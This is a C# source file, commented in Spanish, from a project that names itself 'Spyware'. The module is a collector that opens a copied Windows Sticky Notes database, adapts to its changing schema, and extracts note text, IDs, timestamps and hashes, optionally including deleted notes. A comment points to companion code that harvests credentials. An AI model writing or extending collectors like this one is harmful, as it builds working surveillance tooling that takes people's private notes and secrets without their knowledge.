using Microsoft.Data.Sqlite;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Security;

namespace Spyware.Collectors.Notes;

/// <summary>
/// Columnas resueltas del esquema. Sticky Notes cambia los nombres entre versiones
/// (`plainText`/`formattedText` en 3.x, `Text` en las modernas), así que no se asume
/// ninguno: se leen los nombres reales con `PRAGMA table_info`.
/// </summary>
public sealed record PlumSchema(
    string Table, string? Id, string Text, string? Created, string? Updated, string? Deleted, bool TextIsHtml)
{
    private static readonly string[] TextPreference =
        ["plaintext", "plain_text", "text", "body", "content"];

    private static readonly string[] HtmlPreference = ["formattedtext", "formatted_text", "html"];
    private static readonly string[] IdPreference = ["id", "noteid", "note_id"];

    private static readonly string[] CreatedPreference =
        ["createdat", "datecreated", "created", "firstcreated"];

    private static readonly string[] UpdatedPreference =
        ["updatedat", "lastmodified", "lastmodifieddate", "updated", "dateupdated", "modifiedat"];

    private static readonly string[] DeletedPreference =
        ["isstickydeleted", "markedasdeleted", "isdeleted", "deleted", "recycledate"];

    /// <summary>Null si ninguna columna aporta texto: el esquema no se sabe interpretar.</summary>
    public static PlumSchema? Resolve(string? table, IReadOnlyList<string> columns)
    {
        if (string.IsNullOrWhiteSpace(table)) return null;

        string? text = Pick(columns, TextPreference);
        bool isHtml = false;

        if (text is null)
        {
            text = Pick(columns, HtmlPreference);
            isHtml = text is not null;
        }

        if (text is null) return null;

        return new PlumSchema(
            table,
            Pick(columns, IdPreference),
            text,
            Pick(columns, CreatedPreference),
            Pick(columns, UpdatedPreference),
            Pick(columns, DeletedPreference),
            isHtml);
    }

    private static string? Pick(IReadOnlyList<string> columns, string[] preference) =>
        preference
            .Select(name => columns.FirstOrDefault(column =>
                string.Equals(column, name, StringComparison.OrdinalIgnoreCase)))
            .FirstOrDefault(column => column is not null);
}

/// <summary>
/// Lee la copia de `plum.sqlite`. Igual que con las credenciales, abrir el archivo y
/// entenderlo son dos cosas distintas: un esquema nuevo se informa como `unsupported`,
/// nunca como "no había notas".
/// </summary>
public static class PlumDatabaseReader
{
    public static IReadOnlyList<NoteEvent> Read(string copyPath, string storeName,
                                                NotesSection config, ILog log)
    {
        try
        {
            using var connection = new SqliteConnection($"Data Source={copyPath};Pooling=False;");
            connection.Open();

            using (SqliteCommand pragma = connection.CreateCommand())
            {
                pragma.CommandText = "PRAGMA busy_timeout = 5000;";
                pragma.ExecuteNonQuery();
            }

            (string? Table, IReadOnlyList<string> Columns) = ReadLayout(connection);

            PlumSchema? schema = PlumSchema.Resolve(Table, Columns);

            if (schema is null)
            {
                log.Debug($"plum.sqlite sin esquema conocido (tabla={Table ?? "ninguna"}, " +
                          $"columnas={Columns.Count}).");

                return [new NoteEvent
                {
                    Source = "sticky",
                    Store = storeName,
                    Status = NoteStatus.Unsupported,
                    FailureReason = Table is null ? "sin tabla de notas" : "sin columna de texto"
                }];
            }

            List<NoteEvent> notes = QueryNotes(connection, schema, storeName, config);

            log.Info($"Sticky Notes: {notes.Count} notas ({schema.Table}.{schema.Text}).");
            return notes;
        }
        catch (SqliteException ex)
        {
            log.Warn($"plum.sqlite ilegible: {ex.Message}");

            return [new NoteEvent
            {
                Source = "sticky",
                Store = storeName,
                Status = NoteStatus.Corrupted,
                FailureReason = "sqlite: " + ex.SqliteErrorCode
            }];
        }
        catch (Exception ex)
        {
            log.Error("Fallo al leer plum.sqlite.", ex);

            return [new NoteEvent
            {
                Source = "sticky",
                Store = storeName,
                Status = NoteStatus.Corrupted,
                FailureReason = ex.GetType().Name
            }];
        }
    }

    /// <summary>Tabla de notas y nombres reales de columnas.</summary>
    private static (string? Table, IReadOnlyList<string> Columns) ReadLayout(SqliteConnection connection)
    {
        string? table = null;

        using (SqliteCommand tables = connection.CreateCommand())
        {
            tables.CommandText = """
                SELECT name, CASE WHEN name = 'Note' THEN 0
                                  WHEN name = 'Notes' THEN 1
                                  WHEN name LIKE '%note%' THEN 2
                                  ELSE 3 END AS preferida
                FROM sqlite_master
                WHERE type IN ('table', 'view') AND name NOT LIKE 'sqlite_%'
                ORDER BY preferida, name;
                """;

            using SqliteDataReader reader = tables.ExecuteReader();
            while (reader.Read() && table is null)
            {
                // Ninguna tabla con nombre de nota: mejor decir "no la conozco" que
                // leer la primera tabla del archivo e inventar un resultado.
                if (reader.GetInt64(1) >= 3) break;

                table = reader.GetString(0);
            }
        }

        if (table is null)
            return (null, []);

        var columns = new List<string>();

        using (SqliteCommand pragma = connection.CreateCommand())
        {
            pragma.CommandText = $"PRAGMA table_info({Quote(table)});";

            using SqliteDataReader reader = pragma.ExecuteReader();
            while (reader.Read())
                columns.Add(reader.GetString(1));
        }

        return (table, columns);
    }

    private static List<NoteEvent> QueryNotes(SqliteConnection connection, PlumSchema schema,
                                              string storeName, NotesSection config)
    {
        try
        {
            return Execute(connection, BuildSelect(schema, withOrder: true), schema, storeName, config);
        }
        catch (SqliteException)
        {
            // Vistas sin rowid o columnas calculadas: se reintenta sin orden.
            return Execute(connection, BuildSelect(schema, withOrder: false), schema, storeName, config);
        }
    }

    private static List<NoteEvent> Execute(SqliteConnection connection, string sql, PlumSchema schema,
                                           string storeName, NotesSection config)
    {
        var notes = new List<NoteEvent>();

        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = sql;
        command.Parameters.AddWithValue("$limit", Math.Max(1, config.MaxResultsPerRun));

        using SqliteDataReader reader = command.ExecuteReader();

        while (reader.Read())
        {
            bool deleted = schema.Deleted is not null &&
                           Truthy(reader.GetValue(Ordinal(reader, schema.Deleted)));

            if (deleted && !config.IncludeDeleted) continue;

            string text = NoteText.Sanitize(Text(reader, Ordinal(reader, schema.Text)));

            if (text.Length == 0) continue;

            text = NoteText.Truncate(text, config.MaxTextLength, out bool truncated);

            notes.Add(new NoteEvent
            {
                Source = "sticky",
                Store = storeName,
                NoteId = schema.Id is null ? string.Empty : Text(reader, Ordinal(reader, schema.Id)),
                Text = text,
                Format = schema.TextIsHtml ? "html" : "text",
                Status = deleted ? NoteStatus.Deleted : NoteStatus.Read,
                Deleted = deleted,
                FailureReason = truncated ? "texto recortado" : null,
                Length = text.Length,
                Hash = HashHelper.Sha256Hex(text),
                CreatedAt = schema.Created is null
                    ? null
                    : NoteTime.FromValue(reader.GetValue(Ordinal(reader, schema.Created))),
                UpdatedAt = schema.Updated is null
                    ? null
                    : NoteTime.FromValue(reader.GetValue(Ordinal(reader, schema.Updated)))
            });
        }

        return notes;
    }

    private static string BuildSelect(PlumSchema schema, bool withOrder)
    {
        var columns = new List<string>();

        foreach (string? column in new[] { schema.Id, schema.Text, schema.Created, schema.Updated, schema.Deleted })
            if (column is not null) columns.Add(Quote(column));

        string order = withOrder
            ? schema.Updated is not null ? $" ORDER BY {Quote(schema.Updated)} DESC" : " ORDER BY rowid DESC"
            : string.Empty;

        return $"SELECT {string.Join(", ", columns)} FROM {Quote(schema.Table)}{order} LIMIT $limit;";
    }

    private static int Ordinal(SqliteDataReader reader, string column)
    {
        for (int index = 0; index < reader.FieldCount; index++)
            if (string.Equals(reader.GetName(index), column, StringComparison.OrdinalIgnoreCase))
                return index;

        return -1;
    }

    private static string Text(SqliteDataReader reader, int ordinal)
    {
        if (ordinal < 0 || reader.IsDBNull(ordinal)) return string.Empty;

        try
        {
            return reader.GetString(ordinal);
        }
        catch (InvalidCastException)
        {
            // Algunas versiones guardan el texto como BLOB: se interpreta como UTF-8.
            byte[] raw = reader.GetFieldValue<byte[]>(ordinal);
            return System.Text.Encoding.UTF8.GetString(raw);
        }
    }

    private static bool Truthy(object? value) => value switch
    {
        null or DBNull => false,
        long number => number != 0,
        int number => number != 0,
        double number => number != 0,
        string text => text.Trim() is not ("" or "0" or "false" or "no"),
        _ => Convert.ToBoolean(value, System.Globalization.CultureInfo.InvariantCulture)
    };

    private static string Quote(string identifier) => '"' + identifier.Replace("\"", "\"\"") + '"';
}
